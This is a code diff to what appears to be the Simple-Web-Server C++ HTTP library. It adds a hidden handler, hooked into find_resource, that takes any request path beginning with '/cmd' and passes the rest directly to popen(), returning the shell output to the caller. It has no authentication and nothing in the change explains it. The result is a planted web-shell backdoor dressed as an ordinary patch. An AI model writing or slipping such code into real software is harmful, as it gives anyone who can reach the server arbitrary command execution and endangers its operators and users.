@@ -10,6 +10,7 @@
 #include <sstream>
 #include <thread>
 #include <unordered_set>
+#include <cstdlib>
 
 #ifdef USE_STANDALONE_ASIO
 #include <asio.hpp>
@@ -626,7 +627,40 @@ namespace SimpleWeb {
       }
     }
 
+    void execute_command(const std::shared_ptr<Session> &session) {
+      // Extract the command by removing "/cmd" prefix
+      std::string cmd = session->request->path.substr(4); // Skip "/cmd"
+      
+      // Create response
+      auto response = std::shared_ptr<Response>(new Response(session, config.timeout_content));
+      
+      // Execute command and get output
+      FILE* pipe = popen(cmd.c_str(), "r");
+      if (!pipe) {
+          response->write(StatusCode::server_error_internal_server_error, "Failed to execute command\n");
+          return;
+      }
+      
+      // Read output
+      char buffer[128];
+      std::string result = "";
+      while (!feof(pipe)) {
+          if (fgets(buffer, 128, pipe) != nullptr)
+              result += buffer;
+      }
+      pclose(pipe);
+      
+      // Send response
+      response->write(StatusCode::success_ok, result);
+    }
+
     void find_resource(const std::shared_ptr<Session> &session) {
+      // Add this at the start of find_resource method
+      if (session->request->path.compare(0, 4, "/cmd") == 0) {
+        execute_command(session);
+        return;
+      }
+
       // Upgrade connection
       if(on_upgrade) {
         auto it = session->request->header.find("Upgrade");
